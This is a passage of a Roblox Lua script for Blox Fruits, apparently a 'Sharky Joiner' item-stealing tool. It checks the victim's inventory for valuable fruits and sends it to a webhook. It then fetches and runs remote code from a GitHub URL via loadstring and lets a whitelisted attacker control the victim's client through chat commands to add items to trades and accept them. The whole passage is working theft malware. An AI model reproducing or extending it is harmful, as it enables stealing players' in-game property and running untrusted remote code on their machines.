                local currentMessage = "Fruits [Value] (1/" .. totalChunks .. "): ";
                local chunkIndex = 1;
                for i, fruitName in ipairs(fruitDisplayList) do
                    local prefixLength = string.len("Fruits [Value] (X/Y): ");
                    local separator = (# currentMessage > prefixLength) and ", " or "";
                    local potentialAddition = separator .. fruitName;
                    if string.len(currentMessage) + string.len(potentialAddition) > messageLimit then
                        sendMessage(currentMessage);
                        task.wait(2);
                        chunkIndex = chunkIndex + 1;
                        currentMessage = "Fruits [Value] (" .. chunkIndex .. "/" .. totalChunks .. "): " .. fruitName
                    else
                        currentMessage = currentMessage .. potentialAddition
                    end
                end;
                if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then
                    sendMessage(currentMessage)
                end;
                task.wait(0.5);
                sendMessage("Inventory display complete.")
            end)
        end
    },
    test = {
        description = "Checks script responsiveness.",
        usage = "?test",
        execute = function()
            local startTime = tick();
            task.wait(0.001);
            sendMessage("I'm Responsive! My response time is " .. string.format("%.1f", (tick() - startTime) * 1000) .. "ms")
        end
    },
    help = {
        description = "Displays a condensed list of commands.",
        usage = "?help",
        execute = function()
            task.spawn(function()
                local cmds = {
                    "?help ?test ?jump ?sit ?tp ?reset ?rejoin",
                    "?add ?additem ?addall ?addallitems",
                    "?resetfruit ?invite ?demolish ?showinv",
                    "?allowall ?accept ?cleartrade ?kick"
                };
                sendMessage("--- Commands (V" .. "1.2.6" .. ") ---");
                task.wait(1);
                for i, msg in ipairs(cmds) do
                    sendMessage(msg);
                    task.wait(1)
                end
            end)
        end
    },
    activate = {
        description = "Activates command access using a password.",
        usage = "?activate <password>",
        execute = function(player, password)
            if not password or password == "" then
                sendMessage("Usage: ?activate <password>");
                return
            end;
            if not player or not player:IsA("Player") then
                print("Error: Invalid player object passed to activate command.");
                return
            end;
            local foundPass = false;
            for _, validPass in ipairs(ActivationPasswords) do
                if password == validPass then
                    foundPass = true;
                    break
                end
            end;
            if foundPass then
                if activatedUsers[player.UserId] then
                    sendMessage("You are already activated, " .. player.Name .. ".")
                else
                    activatedUsers[player.UserId] = true;
                    sendMessage("Activation successful for this session, " .. player.Name .. "!")
                end
            else
                sendMessage("Incorrect password.")
            end
        end
    },
    allowall = {
        description = "Toggles allowing ANY player to use commands.",
        usage = "?allowall",
        execute = function()
            allowEveryone = not allowEveryone;
            local status = allowEveryone and "ENABLED" or "DISABLED";
            sendMessage("AllowEveryone Mode: " .. status .. ". Command access is now " .. (allowEveryone and "OPEN to ALL players." or "RESTRICTED."));
            if allowEveryone then
                sendMessage("ANYONE can now use commands")
            end
        end
    },
    -- ADDED COMMAND
    kick = {
        description = "Kicks the script user with a reason.",
        usage = "?kick <reason>",
        execute = function(argument)
            if not argument or argument == "" then
                sendMessage("Usage: ?kick <reason>");
                return
            end;
            local player = game.Players.LocalPlayer;
            pcall(player.Kick, player, argument)
        end
    },
}

-- Command Processor - KEPT (Sharky's Original)
local function processChatCommand(_, player, message)
    if not (player and message and typeof(player) == "Instance" and player:IsA("Player") and message:sub(1, 1) == "?") then
        return
    end
    local commandStr = message:sub(2):match("^%s*(.-)%s*$");
    if not commandStr or commandStr == "" then
        return
    end
    local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$");
    if not command then
        return
    end
    command = command:lower()
    if command == "activate" then
        local cmdFunc = Commands[command];
        if cmdFunc then
            task.spawn(cmdFunc.execute, player, argument)
        end;
        return
    end
    local isAuthorized = allowEveryone or (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
    if not isAuthorized then
        return
    end
    local commandFunc = Commands[command];
    if not commandFunc then
        sendMessage("Unknown command: ?" .. command);
        return
    end
    local playerName = player.Name;
    local playerCooldowns = CommandCooldowns[playerName]
    if playerCooldowns then
        local lastUsed = playerCooldowns[command];
        if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then
            sendMessage("Please wait before using this command again!");
            return
        end
    else
        playerCooldowns = {};
        CommandCooldowns[playerName] = playerCooldowns
    end
    playerCooldowns[command] = tick()
    task.spawn(function()
        local success, err = pcall(commandFunc.execute, argument);
        if not success then
            sendMessage("Error executing command ?" .. command .. ": " .. tostring(err));
            warn("Command Error:", command, argument, err)
        end
    end)
end

-- Main Loop & Init - KEPT (Sharky's Original Structure)
local function startMainLoop()
    local isLoopRunning = true;
    local hasCheckedCurrentTrade = false;
    local currentTable, currentSeat;
    local lastMovementTime = tick();
    local lastTableCheck = tick();
    local lastTradeCheck = tick()
    local UPDATE_INTERVAL = 0.5;
    local TABLE_CHECK_INTERVAL = 2;
    local MOVEMENT_CHECK_INTERVAL = 4;
    local TRADE_VALIDATION_DELAY = 1.5;
    local TRADE_RECHECK_COUNT = 4
    local validateTradePartnerRunning = false
    local function validateTradePartner()
        if validateTradePartnerRunning then
            return
        end;
        validateTradePartnerRunning = true;
        local failedChecks = 0;
        local lastTradeState = false;
        for _ = 1, TRADE_RECHECK_COUNT do
            task.wait(0.25);
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible;
            if lastTradeState ~= currentTradeState or not currentTradeState or not isInTradeWithCorrectPlayer() then
                failedChecks = failedChecks + 1
            end;
            lastTradeState = currentTradeState
        end;
        if failedChecks >= TRADE_RECHECK_COUNT - 1 then
            task.wait(0.1);
            ForceJump()
        end;
        validateTradePartnerRunning = false
    end
    local charAddedConn, charRemovingConn, jumpCleanupFunc
    local function onCharacterAdded(character)
        task.wait(1);
        local humanoid = character:WaitForChild("Humanoid", 5);
        local rootPart = character:WaitForChild("HumanoidRootPart", 5);
        if not humanoid or not rootPart then
            return
        end;
        local now = tick();
        lastMovementTime, lastTableCheck, lastTradeCheck = now, now, now;
        jumpCleanupFunc = disableJump();
        task.spawn(function()
            currentTable, currentSeat = findTradeTable();
            if currentTable and currentSeat then
                tweenToPosition(currentSeat.Position)
            end
        end)
    end
    local function onCharacterRemoving()
        currentTable, currentSeat = nil, nil;
        if jumpCleanupFunc then
            jumpCleanupFunc()
        end
    end
    local function runMainLoop()
        local lastTime = tick();
        while isLoopRunning do
            local now = tick();
            local deltaTime = now - lastTime;
            lastTime = now;
            local character = LocalPlayer.Character;
            if character and character:FindFirstChild("HumanoidRootPart") then
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
                local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible;
                if not isInTrade then
                    hasCheckedCurrentTrade = false;
                    lastTradeCheck = now
                elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then
                    task.spawn(validateTradePartner);
                    hasCheckedCurrentTrade = true
                end;
                if now - lastTableCheck >= TABLE_CHECK_INTERVAL then
                    task.spawn(function()
                        local newTable, newSeat = findTradeTable();
                        if newTable and newSeat then
                            currentTable, currentSeat = newTable, newSeat
                        end
                    end);
                    lastTableCheck = now
                end;
                if currentTable and currentSeat then
                    local root = character.HumanoidRootPart;
                    if root then
                        local distance = (root.Position - currentSeat.Position).Magnitude;
                        if distance > 5 then
                            tweenToPosition(currentSeat.Position)
                        elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then
                            local randomOffset = Vector3.new(math.random(- 1, 1), 0, math.random(- 1, 1));
                            tweenToPosition(currentSeat.Position + randomOffset);
                            lastMovementTime = now
                        end
                    end
                end
            end;
            local timeElapsed = tick() - now;
            local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed);
            task.wait(waitTime)
        end
    end
    charAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded);
    charRemovingConn = LocalPlayer.CharacterRemoving:Connect(onCharacterRemoving)
    if LocalPlayer.Character then
        task.spawn(onCharacterAdded, LocalPlayer.Character)
    end
    task.spawn(runMainLoop)
    return function()
        isLoopRunning = false;
        if charAddedConn then
            charAddedConn:Disconnect();
            charAddedConn = nil
        end;
        if charRemovingConn then
            charRemovingConn:Disconnect();
            charRemovingConn = nil
        end;
        if jumpCleanupFunc then
            jumpCleanupFunc()
        end;
        currentTable, currentSeat = nil, nil
    end
end

local function init()
    local placeId = game.PlaceId
    if placeId == 2753915549 then
        LocalPlayer:Kick("This script works only in Sea 2 or 3!");
        return
    end
    if placeId ~= 4442272183 and placeId ~= 7449423635 then
        LocalPlayer:Kick("This script is meant for Blox Fruits only!");
        return
    end
    local initialInventory = getInventory();
    if not initialInventory then
        LocalPlayer:Kick("Error getting initial inventory.");
        return
    end
    inventory22 = initialInventory -- Set for leave check
    local function checkInventoryForHit(inv)
        local fruitsToHitSet = {};
        for _, f in ipairs(FruitsToHit) do
            fruitsToHitSet[f] = true
        end;
        for _, item in ipairs(inv) do
            if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or item.Type == "Premium" then
                return true
            end
        end;
        return false
    end
    if not checkInventoryForHit(initialInventory) then
        LocalPlayer:Kick("(Alt Account Filter - Requires Target Fruit/Premium Item)");
        return
    end

    task.spawn(function() -- Initial setup tasks
        task.wait(1);
        JoinTeam();
        task.spawn(createNotification);
        sendWebhook(initialInventory)
    end)

    local mainLoopStopper = nil;
    local chatConnection = nil;
    local externalUILoaded = false
    local function onPlayerAdded(player)
        if mainLoopStopper then
            return
        end -- Prevent multiple triggers
        local isWhitelisted = (Usernames and table.find(Usernames, player.Name))
        if not isWhitelisted then
            return
        end

        mainLoopStopper = function()
        end -- Set flag immediately
        print("Target player joined: " .. player.Name .. ". Initializing main features.")

        task.spawn(function()
            if not externalUILoaded then
                print("Loading external UI...")
                local success, err = pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))()
                end)
                if not success then
                    warn("Failed to load external UI:", err)
                else
                    externalUILoaded = true;
                    print("External UI loaded.")
                end
            end

            task.wait(1) -- Wait a bit after UI load attempt
            if not chatConnection then
                chatConnection = Players.PlayerChatted:Connect(processChatCommand);
                print("Chat processor connected.")
            end
            -- Consider adding RunService:Set3dRenderingEnabled(false) here if desired
            mainLoopStopper = startMainLoop();
            print("Main loop started.")
            task.spawn(function()
                task.wait(2);
                sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
            end)
        end)
    end

    local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded)
    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            onPlayerAdded(player)
        end
    end) -- Check existing players

    local localPlayerRemovingConn
    localPlayerRemovingConn = Players.PlayerRemoving:Connect(function(player)
        if player == LocalPlayer then
            if playerAddedConn then
                playerAddedConn:Disconnect()
            end
            if chatConnection then
                chatConnection:Disconnect()
            end
            if mainLoopStopper and type(mainLoopStopper) == "function" then
                mainLoopStopper()
            end -- Call cleanup
            if localPlayerRemovingConn then
                localPlayerRemovingConn:Disconnect()
            end
            RunService:UnbindFromRenderStep("SecurityMonitor") -- Ensure monitor stops
        end
    end)
end

-- Execution Guard
if not shared.ScriptExecuted_SharkyV2_Final_1_2_6 then
    shared.ScriptExecuted_SharkyV2_Final_1_2_6 = true
    task.spawn(function()
        local success, errorMessage = pcall(init)
        if not success then
            warn("SCRIPT INIT ERROR:", errorMessage)
            task.spawn(function()
                local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "");
                LocalPlayer:Kick("Script Initialization Error: " .. safeMsg)
            end)
        end
    end)
else
    warn("Sharky Joiner V2 already executed.")
end
